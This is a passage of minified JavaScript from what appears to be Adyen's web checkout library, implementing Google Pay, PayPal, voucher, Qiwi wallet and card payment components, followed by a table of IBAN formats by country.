0:return(null===(t=window.google)||void 0===t?void 0:t.payments)?[3,2]:[4,new up("https://pay.google.com/gp/p/js/pay.js").load()];case 1:n.sent(),n.label=2;case 2:return[2,new google.payments.api.PaymentsClient(e)]}}))}))},e.prototype.isReadyToPay=function(e){return this.paymentsClient?this.paymentsClient.then((function(t){return t.isReadyToPay({apiVersion:2,apiVersionMinor:0,allowedPaymentMethods:[{type:"CARD",parameters:{allowedAuthMethods:(n=e).allowedAuthMethods,allowedCardNetworks:n.allowedCardNetworks},tokenizationSpecification:{type:"PAYMENT_GATEWAY",parameters:{}}}],existingPaymentMethodRequired:void 0!==(r=n.existingPaymentMethodRequired)&&r});var n,r})):Promise.reject(new Error("Google Pay is not available"))},e.prototype.prefetchPaymentData=function(e){if(!this.paymentsClient)throw new Error("Google Pay is not available");var t=Lf(e);this.paymentsClient.then((function(e){return e.prefetchPaymentData(t)}))},e.prototype.initiatePayment=function(e){if(!this.paymentsClient)throw new Error("Google Pay is not available");var t=Lf(e);return this.paymentsClient.then((function(e){return e.loadPaymentData(t)}))},e}(),Df=function(e){function t(){var t=null!==e&&e.apply(this,arguments)||this;return t.clicked=!1,t.handleClick=function(e){e.preventDefault(),e.stopPropagation(),t.clicked||(t.props.onClick(e),t.clicked=!0,setTimeout((function(){t.clicked=!1}),300))},t}return Al(t,e),t.prototype.componentDidMount=function(){var e=this,t=this.props,n=t.buttonColor,r=t.buttonType,i=t.buttonLocale,a=t.buttonSizeMode;t.paymentsClient.then((function(t){return t.createButton({onClick:e.handleClick,buttonType:r,buttonColor:n,buttonLocale:i,buttonSizeMode:a})})).then((function(t){e.paywithgoogleWrapper.appendChild(t)}))},t.prototype.render=function(){var e=this;return Hl("span",{className:"adyen-checkout__paywithgoogle",ref:function(t){e.paywithgoogleWrapper=t}})},t.defaultProps={buttonColor:"default",buttonType:"long",buttonSizeMode:"static"},t}(Gl),Rf={environment:"TEST",existingPaymentMethodRequired:!1,buttonColor:"default",buttonType:"long",buttonSizeMode:void 0,showPayButton:!0,configuration:{gatewayMerchantId:"",merchantId:"",merchantName:""},amount:{value:0,currency:"USD"},countryCode:"US",totalPriceStatus:"FINAL",onError:function(){},onAuthorized:function(e){return e},onSubmit:function(){},onClick:function(e){return e()},allowedAuthMethods:["PAN_ONLY","CRYPTOGRAM_3DS"],allowedCardNetworks:["AMEX","DISCOVER","JCB","MASTERCARD","VISA"],allowCreditCards:!0,allowPrepaidCards:!0,billingAddressRequired:!1,billingAddressParameters:void 0,emailRequired:!1,shippingAddressRequired:!1,shippingAddressParameters:void 0,shippingOptionRequired:!1,shippingOptionParameters:void 0,paymentMethods:[]},jf=function(e){function t(){var t=null!==e&&e.apply(this,arguments)||this;return t.googlePay=new Nf(t.props),t.loadPayment=function(){var e=t.props.onAuthorized,n=void 0===e?function(){}:e;return new Promise((function(e,n){return t.props.onClick(e,n)})).then((function(){return t.googlePay.initiatePayment(t.props)})).then((function(e){return t.setState({googlePayToken:e.paymentMethodData.tokenizationData.token,googlePayCardNetwork:e.paymentMethodData.info.cardNetwork}),n(e)})).catch((function(e){return t.props.onError(e),Promise.reject(e)}))},t.submit=function(){return t.loadPayment().then((function(){t.props.onSubmit&&t.props.onSubmit({data:t.data,isValid:t.isValid},t.elementRef)}))},t.startPayment=function(){return t.loadPayment()},t.isAvailable=function(){return t.isReadyToPay().then((function(e){if(!e.result)throw new Error("Google Pay is not available");if(!1===e.paymentMethodPresent)throw new Error("Google Pay - No paymentMethodPresent");return!0})).catch((function(){return!1}))},t.isReadyToPay=function(){return t.googlePay.isReadyToPay(t.props)},t.prefetch=function(){return t.googlePay.prefetchPaymentData(t.props)},t}return Al(t,e),t.prototype.formatProps=function(e){var t,n,r,i,a,o,s=(null===(t=e.brands)||void 0===t?void 0:t.length)?(a=e.brands,o={mc:"MASTERCARD",amex:"AMEX",visa:"VISA",interac:"INTERAC",discover:"DISCOVER"},a.reduce((function(e,t){return o[t]&&!e.includes(o[t])&&e.push(o[t]),e}),[])):e.allowedCardNetworks,l=null!==(n=e.buttonSizeMode)&&void 0!==n?n:e.isDropin?"fill":"static",c=function(e){void 0===e&&(e="");var t=e.toLowerCase().substring(0,2);return Of.includes(t)?t:null}(null!==(r=e.buttonLocale)&&void 0!==r?r:null===(i=e.i18n)||void 0===i?void 0:i.locale);return ml(ml({},e),{showButton:!0===e.showPayButton,configuration:e.configuration,allowedCardNetworks:s,buttonSizeMode:l,buttonLocale:c})},t.prototype.formatData=function(){var e;return{paymentMethod:ml({type:null!==(e=this.props.type)&&void 0!==e?e:t.type},this.state),browserInfo:this.browserInfo}},Object.defineProperty(t.prototype,"isValid",{get:function(){return!!this.state.googlePayToken},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"browserInfo",{get:function(){return np()},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"icon",{get:function(){var e;return null!==(e=this.props.icon)&&void 0!==e?e:gc({loadingContext:this.props.loadingContext})("googlepay")},enumerable:!1,configurable:!0}),t.prototype.render=function(){return this.props.showPayButton?Hl(Df,{buttonColor:this.props.buttonColor,buttonType:this.props.buttonType,buttonSizeMode:this.props.buttonSizeMode,buttonLocale:this.props.buttonLocale,paymentsClient:this.googlePay.paymentsClient,onClick:this.submit}):null},t.type="paywithgoogle",t.defaultProps=Rf,t}(Zc),Uf=function(e){function t(){return null!==e&&e.apply(this,arguments)||this}return Al(t,e),t.type="entercash",t}(xp),$f={telephoneNumber:[{validate:function(e){return!!e&&e.length<=11},errorMessage:"voucher.econtext.telephoneNumber.invalid",modes:["input","blur"]},{validate:function(e){return!!e&&Nu.test(e)&&(10===e.length||11===e.length)},errorMessage:"voucher.econtext.telephoneNumber.invalid",modes:["blur"]}]};function zf(e){var t=Dc(null),n=Xc().i18n,r=Fc("ready"),i=r[0],a=r[1];return this.setStatus=a,this.showValidation=function(){t.current&&t.current.showValidation()},Hl("div",{className:"adyen-checkout__econtext-input__field"},Hl(td,{data:e.data,requiredFields:["firstName","lastName","telephoneNumber","shopperEmail"],onChange:e.onChange,namePrefix:"econtext",ref:t,validationRules:$f}),e.showPayButton&&e.payButton({status:i,label:n.get("confirmPurchase")}))}function Hf(e){var t,n,r=(t=e,(n=document.createElement("textArea")).readOnly=!0,n.value=t,document.body.appendChild(n),n);if(window.navigator.userAgent.match(/ipad|iphone/i)){var i=document.createRange();i.selectNodeContents(r);var a=window.getSelection();a.removeAllRanges(),a.addRange(i),r.setSelectionRange(0,999999)}else r.select();document.execCommand("copy"),document.body.removeChild(r)}function Vf(e){var t=e.voucherDetails,n=void 0===t?[]:t,r=e.className,i=void 0===r?"":r,a=vl(e,["voucherDetails","className"]),o=Xc(),s=o.i18n,l=o.loadingContext;return Hl("div",{className:Cc("adyen-checkout__voucher-result","adyen-checkout__voucher-result--"+a.paymentMethodType,i)},Hl("div",{className:"adyen-checkout__voucher-result__top"},Hl("div",{className:"adyen-checkout__voucher-result__image"},!!a.imageUrl&&Hl("span",{className:"adyen-checkout__voucher-result__image__wrapper"},Hl("img",{alt:a.paymentMethodType,className:"adyen-checkout__voucher-result__image__brand",src:a.imageUrl})),!!a.issuerImageUrl&&Hl("span",{className:"adyen-checkout__voucher-result__image__wrapper"},Hl("img",{alt:a.paymentMethodType,className:"adyen-checkout__voucher-result__image__issuer",src:a.issuerImageUrl}))),Hl("div",{className:"adyen-checkout__voucher-result__introduction"},a.introduction," ",a.instructionsUrl&&Hl("a",{className:"adyen-checkout__link adyen-checkout__link--voucher-result-instructions",href:a.instructionsUrl,target:"_blank",rel:"noopener noreferrer"},s.get("voucher.readInstructions")," ›")),a.amount&&Hl("div",{className:"adyen-checkout__voucher-result__amount"},a.amount,a.surcharge&&Hl("span",{className:"adyen-checkout__voucher-result__surcharge"},"(",s.get("voucher.surcharge").replace("%@",a.surcharge),")"))),a.reference&&Hl("div",{className:"adyen-checkout__voucher-result__separator"},Hl("div",{className:"adyen-checkout__voucher-result__separator__inner"}),Hl("div",{className:"adyen-checkout__voucher-result__code__label"},Hl("span",{className:"adyen-checkout__voucher-result__code__label__text"},s.get("voucher.paymentReferenceLabel")))),Hl("div",{className:"adyen-checkout__voucher-result__bottom"},a.reference&&Hl("div",{className:"adyen-checkout__voucher-result__code"},a.barcode&&Hl("img",{alt:s.get("voucher.paymentReferenceLabel"),className:"adyen-checkout__voucher-result__code__barcode",src:a.barcode}),Hl("span",null,a.reference)),(!!a.downloadUrl||!!a.copyBtn)&&Hl("ul",{className:"adyen-checkout__voucher-result__actions"},!!a.copyBtn&&Hl("li",{className:"adyen-checkout__voucher-result__actions__item"},Hl(Yc,{inline:!0,secondary:!0,onClick:function(e,t){var n=t.complete;Hf(a.reference),n()},icon:gc({loadingContext:l,imageFolder:"components/"})("copy"),label:s.get("button.copy")})),!!a.downloadUrl&&Hl("li",{className:"adyen-checkout__voucher-result__actions__item"},Hl(Yc,{inline:!0,secondary:!0,href:a.downloadUrl,icon:gc({loadingContext:l,imageFolder:"components/"})("download"),label:a.downloadButtonText||s.get("button.download"),target:"_blank",rel:"noopener noreferrer"}))),Hl("ul",{className:"adyen-checkout__voucher-result__details"},n.filter((function(e){var t=e.label,n=e.value;return!!t&&!!n})).map((function(e,t){var n=e.label,r=e.value;return Hl("li",{key:t,className:"adyen-checkout__voucher-result__details__item"},Hl("span",{className:"adyen-checkout__voucher-result__details__label"},n),Hl("span",{className:"adyen-checkout__voucher-result__details__value"},r))})))))}var Qf=function(e){var t=e.reference,n=e.totalAmount,r=e.expiresAt,i=e.paymentMethodType,a=e.maskedTelephoneNumber,o=e.instructionsUrl,s=e.collectionInstitutionNumber,l=Xc(),c=l.loadingContext,u=l.i18n;return Hl(Vf,{paymentMethodType:i,reference:t,introduction:u.get("voucher.introduction.econtext"),imageUrl:gc({loadingContext:c})(i),instructionsUrl:o,amount:n&&u.amount(n.value,n.currency),voucherDetails:[{label:u.get("voucher.collectionInstitutionNumber"),value:s},{label:u.get("voucher.expirationDate"),value:u.date(r)},{label:u.get("voucher.telephoneNumber"),value:a}],copyBtn:!0})},Gf=function(e){function t(){return null!==e&&e.apply(this,arguments)||this}return Al(t,e),Object.defineProperty(t.prototype,"isValid",{get:function(){return!!this.state.isValid},enumerable:!1,configurable:!0}),t.prototype.formatData=function(){return ml(ml({},this.state.data),{paymentMethod:{type:this.props.type||t.type}})},Object.defineProperty(t.prototype,"icon",{get:function(){return gc({loadingContext:this.props.loadingContext})(this.props.type)},enumerable:!1,configurable:!0}),t.prototype.render=function(){var e=this;return Hl(Xd,{i18n:this.props.i18n,loadingContext:this.props.loadingContext},this.props.reference?Hl(Qf,ml({ref:function(t){e.componentRef=t}},this.props)):Hl(zf,ml({ref:function(t){e.componentRef=t}},this.props,{onChange:this.setState,onSubmit:this.submit,payButton:this.payButton})))},t.type="econtext",t}(Zc),Wf=["ES","FR"],Kf=function(e){function t(){return null!==e&&e.apply(this,arguments)||this}return Al(t,e),t.prototype.formatProps=function(t){return ml(ml({},e.prototype.formatProps.call(this,t)),{allowedCountries:t.countryCode?[t.countryCode]:Wf})},t.type="facilypay_3x",t}(Yd),qf=function(e){function t(){return null!==e&&e.apply(this,arguments)||this}return Al(t,e),t.prototype.formatProps=function(t){return ml(ml({},e.prototype.formatProps.call(this,t)),{allowedCountries:t.countryCode?[t.countryCode]:Wf})},t.type="facilypay_4x",t}(Yd),Xf=function(e){function t(){return null!==e&&e.apply(this,arguments)||this}return Al(t,e),t.prototype.formatProps=function(t){return ml(ml({},e.prototype.formatProps.call(this,t)),{allowedCountries:t.countryCode?[t.countryCode]:Wf})},t.type="facilypay_6x",t}(Yd),Yf=function(e){function t(){return null!==e&&e.apply(this,arguments)||this}return Al(t,e),t.prototype.formatProps=function(t){return ml(ml({},e.prototype.formatProps.call(this,t)),{allowedCountries:t.countryCode?[t.countryCode]:Wf})},t.type="facilypay_10x",t}(Yd),Jf=function(e){function t(){return null!==e&&e.apply(this,arguments)||this}return Al(t,e),t.prototype.formatProps=function(t){return ml(ml({},e.prototype.formatProps.call(this,t)),{allowedCountries:t.countryCode?[t.countryCode]:Wf})},t.type="facilypay_12x",t}(Yd),Zf=function(e){function t(){return null!==e&&e.apply(this,arguments)||this}return Al(t,e),t.type="ideal",t}(xp),eA=["black","white"],tA=["en_US","en_AU","en_GB","fr_CA","es_ES","it_IT","fr_FR","de_DE","pt_BR","zh_CN","da_DK","zh_HK","id_ID","he_IL","ja_JP","ko_KR","nl_NL","no_NO","pl_PL","pt_PT","ru_RU","sv_SE","th_TH","zh_TW"],nA=function(e,t){return void 0===t&&(t={}),"paypal"===e?ml({},t):Object.keys(t).reduce((function(e,n){var r=t[n];return("color"!==n||eA.includes(r))&&(e[n]=r),e}),{})};function rA(e){var t=e.onInit,n=e.onComplete,r=e.onClick,i=e.onCancel,a=e.onError,o=e.onShippingChange,s=e.onSubmit,l=e.paypalRef,c=e.style,u=Dc(null),d=Dc(null),p=function(e,u){var d=l.Buttons({fundingSource:e,style:nA(e,c),onInit:t,onClick:r,onCancel:i,onError:a,onShippingChange:o,createOrder:s,onApprove:n});d.isEligible()&&d.render(u.current)};return Oc((function(){var t=l.FUNDING,n=t.PAYPAL,r=t.CREDIT;p(n,u),e.blockPayPalCreditButton||p(r,d)}),[]),Hl("div",{className:"adyen-checkout__paypal__buttons"},Hl("div",{className:"adyen-checkout__paypal__button adyen-checkout__paypal__button--paypal",ref:u}),Hl("div",{className:"adyen-checkout__paypal__button adyen-checkout__paypal__button--credit",ref:d}))}function iA(e){var t=Xc().i18n,n=Fc("pending"),r=n[0],i=n[1];this.setStatus=function(e){i(e)};var a=function(){i("ready")};return Oc((function(){var t,n,r,i,o,s,l,c,u,d,p,h,f,A,m,v,g,y,b=(r=(t=e).amount,i=t.countryCode,o=t.debug,l=void 0===(s=t.environment)?"":s,c=t.locale,u=t.configuration,d=t.commit,p=t.vault,n=c?c.replace("-","_"):null,h=tA.includes(n)?n:null,f=r?r.currency:null,m=(A="test"===l.toLowerCase())?"AVzsPoGmjcm99YG02kq0iWL3KP3JedbMQJO2QUnVUc-t7aUzjkBWte7relkAC5SPUL50ovLGKmxfA674":"AU0Z-TP9t5_9196agaBN6ZD3UAwypdP1IX8ZYH3PcNNAQMXUTDQlChruXqQEhyI6-NKBKowN6ydkj477",v=u.merchantId,g=u.intent,y=ml(ml(ml(ml(ml(ml(ml({},v&&{"merchant-id":v}),h&&{locale:h}),i&&A&&{"buyer-country":i}),o&&A&&{debug:o}),f&&{currency:f}),g&&{intent:g}),{commit:d,vault:p,"client-id":m,"integration-date":"2020-02-01",components:"buttons,funding-eligibility"}),"https://www.paypal.com/sdk/js?"+decodeURIComponent(Object.keys(y).map((function(e){return e+"="+y[e]})).join("&"))),_=new up(b);return window.paypal?a():_.load().then(a),function(){_.remove()}}),[]),Hl("div",{className:"adyen-checkout__paypal"},"pending"===r?Hl("div",{className:"adyen-checkout__paypal__status adyen-checkout__paypal__status--pending"},Hl(xc,null)):"processing"===r?Hl("div",{className:"adyen-checkout__paypal__status adyen-checkout__paypal__status--processing"},Hl(xc,{size:"medium",inline:!0})," ",t.get("paypal.processingPayment")):Hl(rA,ml({},e,{onComplete:function(t){i("processing"),e.onComplete(t)},paypalRef:window.paypal})))}var aA={environment:"TEST",status:"loading",showPayButton:!0,merchantId:"",intent:null,commit:!0,vault:!1,style:{height:48},blockPayPalCreditButton:!1,configuration:{merchantId:"",intent:null},onSubmit:function(){},onAdditionalDetails:function(){},onInit:function(){},onClick:function(){},onCancel:function(){},onError:function(){},onShippingChange:function(){}},oA="The instance of the PayPal component being used is not the same which started the payment",sA=function(e){function t(t){var n=e.call(this,t)||this;return n.paymentData=null,n.resolve=null,n.reject=null,n.handleAction=n.handleAction.bind(n),n.updateWithAction=n.updateWithAction.bind(n),n.handleCancel=n.handleCancel.bind(n),n.handleComplete=n.handleComplete.bind(n),n.handleError=n.handleError.bind(n),n.handleSubmit=n.handleSubmit.bind(n),n.submit=n.submit.bind(n),n}return Al(t,e),t.prototype.formatData=function(){return{paymentMethod:{type:t.type,subtype:t.subtype}}},t.prototype.handleAction=function(e){return this.updateWithAction(e)},t.prototype.updateWithAction=function(e){if(e.paymentMethodType!==this.data.paymentMethod.type)throw new Error("Invalid Action");return e.paymentData&&(this.paymentData=e.paymentData),e.sdkData&&e.sdkData.token?this.handleResolve(e.sdkData.token):this.handleReject("No token was provided"),null},Object.defineProperty(t.prototype,"isValid",{get:function(){return!0},enumerable:!1,configurable:!0}),t.prototype.handleCancel=function(e){this.props.onCancel(e,this.elementRef)},t.prototype.handleComplete=function(e){var t={data:{details:e,paymentData:this.paymentData}};this.props.onAdditionalDetails(t,this.elementRef)},t.prototype.handleError=function(e){this.props.onError(e,this.elementRef)},t.prototype.handleResolve=function(e){if(!this.resolve)return this.handleError(oA);this.resolve(e)},t.prototype.handleReject=function(e){if(!this.reject)return this.handleError(oA);this.reject(new Error(e))},t.prototype.startPayment=function(){return Promise.reject("Calling submit() is not supported for this payment method")},t.prototype.handleSubmit=function(){var e=this,t=this.data,n=this.isValid;return this.props.onSubmit&&this.props.onSubmit({data:t,isValid:n},this.elementRef),new Promise((function(t,n){e.resolve=t,e.reject=n}))},t.prototype.submit=function(){var e=this;this.startPayment().catch((function(t){e.props.onError(t,e.elementRef)}))},t.prototype.render=function(){var e=this;return this.props.showPayButton?Hl(Xd,{i18n:this.props.i18n,loadingContext:this.props.loadingContext},Hl(iA,ml({ref:function(t){e.componentRef=t}},this.props,{onCancel:this.handleCancel,onChange:this.setState,onComplete:this.handleComplete,onError:this.handleError,onSubmit:this.handleSubmit}))):null},t.type="paypal",t.subtype="sdk",t.defaultProps=aA,t}(Zc);function lA(e){var t,n=Xc().i18n,r=Fc("ready"),i=r[0],a=r[1],o=!!(null===(t=null==e?void 0:e.items)||void 0===t?void 0:t.length),s=Hu({schema:bl(bl([],o?["phonePrefix"]:[]),["phoneNumber"]),defaultData:ml({},o?{phonePrefix:e.selected}:{}),rules:{phoneNumber:{modes:["blur"],errorMessage:"error.va.gen.01",validate:function(e){return 6<(null==e?void 0:e.length)}}}}),l=s.handleChangeFor,c=s.triggerValidation,u=s.data,d=s.valid,p=s.errors,h=s.isValid;return Oc((function(){e.onChange({data:u,valid:d,errors:p,isValid:h})}),[u,d,p,h]),this.showValidation=c,this.setStatus=a,Hl("div",{className:"adyen-checkout__phone-input"},Hl(mu,{errorMessage:!!p.phoneNumber,label:n.get(e.phoneLabel),className:Cc({"adyen-checkout__input--phone-number":!0}),inputWrapperModifiers:["phoneInput"]},Hl("div",{className:"adyen-checkout__input-wrapper"},Hl("div",{className:Cc({"adyen-checkout__input":!0,"adyen-checkout__input--invalid":!!p.phoneNumber})},!!o&&Hl(mu,{inputWrapperModifiers:["phoneInput"]},Lu("select",{className:"adyen-checkout__dropdown--small adyen-checkout__countryFlag",filterable:!1,items:e.items,name:e.prefixName,onChange:l("phonePrefix"),placeholder:n.get("infix"),selected:u.phonePrefix}),Hl("div",{className:"adyen-checkout__phoneNumber"},Hl("div",null,u.phonePrefix),Hl("input",{type:"tel",name:e.phoneName,value:u.phoneNumber,onInput:l("phoneNumber","input"),onChange:l("phoneNumber","blur"),placeholder:"123 456 789",className:"adyen-checkout__input adyen-checkout__input--phoneNumber",autoCorrect:"off"})))))),this.props.showPayButton&&this.props.payButton({status:i}))}lA.defaultProps={phoneLabel:"telephoneNumber"};var cA=function(e){if(!e)throw new Error("No item passed");if(!e.code||!e.id)return!1;var t=e.code.toUpperCase().replace(/./g,(function(e){return String.fromCodePoint?String.fromCodePoint(e.charCodeAt(0)+127397):""}));return ml(ml({},e),{name:t+" "+e.name+" ("+e.id+")",selectedOptionName:t})},uA=[{id:"+7",name:"Russian Federation",code:"RU"},{id:"+9955",name:"Georgia",code:"GE"},{id:"+507",name:"Panama",code:"PA"},{id:"+44",name:"United Kingdom",code:"GB"},{id:"+992",name:"Tajikistan",code:"TJ"},{id:"+370",name:"Lithuania",code:"LT"},{id:"+972",name:"Israel",code:"IL"},{id:"+996",name:"Kyrgyzstan",code:"KG"},{id:"+380",name:"Ukraine",code:"UA"},{id:"+84",name:"Viet Nam",code:"VN"},{id:"+90",name:"Turkey",code:"TR"},{id:"+994",name:"Azerbaijan",code:"AZ"},{id:"+374",name:"Armenia",code:"AM"},{id:"+371",name:"Latvia",code:"LV"},{id:"+91",name:"India",code:"IN"},{id:"+66",name:"Thailand",code:"TH"},{id:"+373",name:"Moldova",code:"MD"},{id:"+1",name:"United States",code:"US"},{id:"+81",name:"Japan",code:"JP"},{id:"+998",name:"Uzbekistan",code:"UZ"},{id:"+77",name:"Kazakhstan",code:"KZ"},{id:"+375",name:"Belarus",code:"BY"},{id:"+372",name:"Estonia",code:"EE"},{id:"+40",name:"Romania",code:"RO"},{id:"+82",name:"Korea",code:"KR"}],dA=function(e){function t(){return null!==e&&e.apply(this,arguments)||this}return Al(t,e),Object.defineProperty(t.prototype,"isValid",{get:function(){return!!this.state.isValid},enumerable:!1,configurable:!0}),t.prototype.formatProps=function(e){return ml(ml({onValid:function(){}},e),{selected:function(e,t){if(e&&t){var n=e.find((function(e){return e.code===t}));return!!n&&n.id}return!1}(e.items,e.countryCode)})},t.prototype.formatData=function(){return{paymentMethod:{type:t.type,"qiwiwallet.telephoneNumberPrefix":this.state.data?this.state.data.phonePrefix:"","qiwiwallet.telephoneNumber":this.state.data?this.state.data.phoneNumber:""}}},t.prototype.render=function(){var e=this;return Hl(Xd,{i18n:this.props.i18n,loadingContext:this.props.loadingContext},Hl(lA,ml({ref:function(t){e.componentRef=t}},this.props,this.state,{phoneLabel:"mobileNumber",onChange:this.setState,onSubmit:this.submit,payButton:this.payButton})))},t.type="qiwiwallet",t.defaultProps={items:uA.map(cA).filter((function(e){return!1!==e})),countryCode:uA[0].code,prefixName:"qiwiwallet.telephoneNumberPrefix",phoneName:"qiwiwallet.telephoneNumber"},t}(Zc);function pA(e){var t=this,n=Dc(null),r=Fc({}),i=r[0],a=r[1],o=Fc({}),s=o[0],l=o[1],c=Fc({}),u=c[0],d=c[1],p=Fc(!1),h=p[0],f=p[1],A=Fc(null),m=A[0],v=A[1],g=Fc([]),y=g[0],b=g[1],_=Fc(""),w=_[0],C=_[1],x=Rc((function(){return vf(e,{sfp:n},{dualBrandSelectElements:y,setDualBrandSelectElements:b,setSelectedBrandValue:C,issuingCountryCode:m,setIssuingCountryCode:v})}),[y,m]);return this.processBinLookupResponse=function(e,t){x.processBinLookup(e,t)},this.dualBrandingChangeHandler=x.handleDualBrandSelection,Oc((function(){return t.setFocusOn=n.current.setFocusOn,t.updateStyles=n.current.updateStyles,t.showValidation=n.current.showValidation,t.handleUnsupportedCard=n.current.handleUnsupportedCard,function(){n.current.destroy()}}),[]),Oc((function(){e.onChange({data:u,valid:s,errors:i,isValid:h,selectedBrandValue:w})}),[u,s,i,w]),Hl(Wh,ml({ref:n},e,{onChange:function(e){d(ml(ml({},u),e.data)),a(ml(ml({},i),e.errors)),l(ml(ml({},s),e.valid)),f(e.isSfpValid)},render:function(){return null}}))}pA.defaultProps={onChange:function(){},onError:function(){}};var hA=function(e){function t(){var t=null!==e&&e.apply(this,arguments)||this;return t.onBinValue=wf(t),t}return Al(t,e),t.prototype.formatProps=function(e){return ml(ml(ml({},e),{type:"scheme"===e.type?"card":e.type}),e.brands&&!e.groupTypes&&{groupTypes:e.brands})},t.prototype.formatData=function(){var e=this.state.selectedBrandValue||this.props.brand;return{paymentMethod:ml(ml({type:t.type},this.state.data),e&&{brand:e}),browserInfo:this.browserInfo}},t.prototype.updateStyles=function(e){var t;return(null===(t=this.componentRef)||void 0===t?void 0:t.updateStyles)&&this.componentRef.updateStyles(e),this},t.prototype.setFocusOn=function(e){var t;return(null===(t=this.componentRef)||void 0===t?void 0:t.setFocusOn)&&this.componentRef.setFocusOn(e),this},t.prototype.processBinLookupResponse=function(e){var t;return(null===(t=this.componentRef)||void 0===t?void 0:t.processBinLookupResponse)&&this.componentRef.processBinLookupResponse(e),this},t.prototype.dualBrandingChangeHandler=function(e){var t;return(null===(t=this.componentRef)||void 0===t?void 0:t.dualBrandingChangeHandler)&&this.componentRef.dualBrandingChangeHandler(e),this},t.prototype.handleUnsupportedCard=function(e){var t;return(null===(t=this.componentRef)||void 0===t?void 0:t.handleUnsupportedCard)&&this.componentRef.handleUnsupportedCard(e),this},t.prototype.onBinLookup=function(e){var t,n=this,r=ml({},e);r.rootNode=this._node,r.isReset||(r.supportedBrandsRaw=null===(t=e.supportedBrandsRaw)||void 0===t?void 0:t.map((function(e){var t,r;return e.brandImageUrl=null!==(r=null===(t=n.props.brandsConfiguration[e.brand])||void 0===t?void 0:t.icon)&&void 0!==r?r:Vp(e.brand,n.props.loadingContext),e}))),this.props.onBinLookup(r)},Object.defineProperty(t.prototype,"isValid",{get:function(){return!!this.state.isValid},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"icon",{get:function(){return gc({loadingContext:this.props.loadingContext})(this.props.type)},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"browserInfo",{get:function(){return np()},enumerable:!1,configurable:!0}),t.prototype.render=function(){var e=this;return Hl(Xd,{i18n:this.props.i18n,loadingContext:this.props.loadingContext},Hl(pA,ml({ref:function(t){e.componentRef=t}},this.props,this.state,{rootNode:this._node,onChange:this.setState,onBinValue:this.onBinValue})))},t.type="scheme",t.analyticsType="custom-scheme",t.defaultProps={onBinLookup:function(){},brandsConfiguration:{}},t}(Zc),fA={AD:{length:24,structure:"F04F04A12",example:"AD9912345678901234567890"},AE:{length:23,structure:"F03F16",example:"AE993331234567890123456"},AL:{length:28,structure:"F08A16",example:"AL47212110090000000235698741"},AT:{length:20,structure:"F05F11",example:"AT611904300234573201"},AZ:{length:28,structure:"U04A20",example:"AZ21NABZ00000000137010001944"},BA:{length:20,structure:"F03F03F08F02",example:"BA391290079401028494"},BE:{length:16,structure:"F03F07F02",example:"BE68 5390 0754 7034"},BG:{length:22,structure:"U04F04F02A08",example:"BG80BNBG96611020345678"},BH:{length:22,structure:"U04A14",example:"BH67BMAG00001299123456"},BR:{length:29,structure:"F08F05F10U01A01",example:"BR9700360305000010009795493P1"},CH:{length:21,structure:"F05A12",example:"CH9300762011623852957"},CR:{length:22,structure:"F04F14",example:"CR72012300000171549015"},CY:{length:28,structure:"F03F05A16",example:"CY17002001280000001200527600"},CZ:{length:24,structure:"F04F06F10",example:"CZ6508000000192000145399"},DE:{length:22,structure:"F08F10",example:"DE00123456789012345678"},DK:{length:18,structure:"F04F09F01",example:"DK5000400440116243"},DO:{length:28,structure:"U04F20",example:"DO28BAGR00000001212453611324"},EE:{length:20,structure:"F02F02F11F01",example:"EE382200221020145685"},ES:{length:24,structure:"F04F04F01F01F10",example:"ES9121000418450200051332"},FI:{length:18,structure:"F06F07F01",example:"FI2112345600000785"},FO:{length:18,structure:"F04F09F01",example:"FO6264600001631634"},FR:{length:27,structure:"F05F05A11F02",example:"FR1420041010050500013M02606"},GB:{length:22,structure:"U04F06F08",example:"GB29NWBK60161331926819"},GE:{length:22,structure:"U02F16",example:"GE29NB0000000101904917"},GI:{length:23,structure:"U04A15",example:"GI75NWBK000000007099453"},GL:{length:18,structure:"F04F09F01",example:"GL8964710001000206"},GR:{length:27,structure:"F03F04A16",example:"GR1601101250000000012300695"},GT:{length:28,structure:"A04A20",example:"GT82TRAJ01020000001210029690"},HR:{length:21,structure:"F07F10",example:"HR1210010051863000160"},HU:{length:28,structure:"F03F04F01F15F01",example:"HU42117730161111101800000000"},IE:{length:22,structure:"U04F06F08",example:"IE29AIBK93115212345678"},IL:{length:23,structure:"F03F03F13",example:"IL620108000000099999999"},IS:{length:26,structure:"F04F02F06F10",example:"IS140159260076545510730339"},IT:{length:27,structure:"U01F05F05A12",example:"IT60X0542811101000000123456"},KW:{length:30,structure:"U04A22",example:"KW81CBKU0000000000001234560101"},KZ:{length:20,structure:"F03A13",example:"KZ86125KZT5004100100"},LB:{length:28,structure:"F04A20",example:"LB62099900000001001901229114"},LC:{length:32,structure:"U04F24",example:"LC07HEMM000100010012001200013015"},LI:{length:21,structure:"F05A12",example:"LI21088100002324013AA"},LT:{length:20,structure:"F05F11",example:"LT121000011101001000"},LU:{length:20,structure:"F03A13",example:"LU280019400644750000"},LV:{length:21,structure:"U04A13",example:"LV80BANK0000435195001"},MC:{length:27,structure:"F05F05A11F02",example:"MC5811222000010123456789030"},MD:{length:24,structure:"U02A18",example:"MD24AG000225100013104168"},ME:{length:22,structure:"F03F13F02",example:"ME25505000012345678951"},MK:{length:19,structure:"F03A10F02",example:"MK07250120000058984"},MR:{length:27,structure:"F05F05F11F02",example:"MR1300020001010000123456753"},MT:{length:31,structure:"U04F05A18",example:"MT84MALT011000012345MTLCAST001S"},MU:{length:30,structure:"U04F02F02F12F03U03",example:"MU17BOMM0101101030300200000MUR"},NL:{length:18,structure:"U04F10",example:"NL99BANK0123456789"},NO:{length:15,structure:"F04F06F01",example:"NO9386011117947"},PK:{length:24,structure:"U04A16",example:"PK36SCBL0000001123456702"},PL:{length:28,structure:"F08F16",example:"PL00123456780912345678901234"},PS:{length:29,structure:"U04A21",example:"PS92PALS000000000400123456702"},PT:{length:25,structure:"F04F04F11F02",example:"PT50000201231234567890154"},RO:{length:24,structure:"U04A16",example:"RO49AAAA1B31007593840000"},RS:{length:22,structure:"F03F13F02",example:"RS35260005601001611379"},SA:{length:24,structure:"F02A18",example:"SA0380000000608010167519"},SE:{length:24,structure:"F03F16F01",example:"SE4550000000058398257466"},SI:{length:19,structure:"F05F08F02",example:"SI56263300012039086"},SK:{length:24,structure:"F04F06F10",example:"SK3112000000198742637541"},SM:{length:27,structure:"U01F05F05A12",example:"SM86U0322509800000000270100"}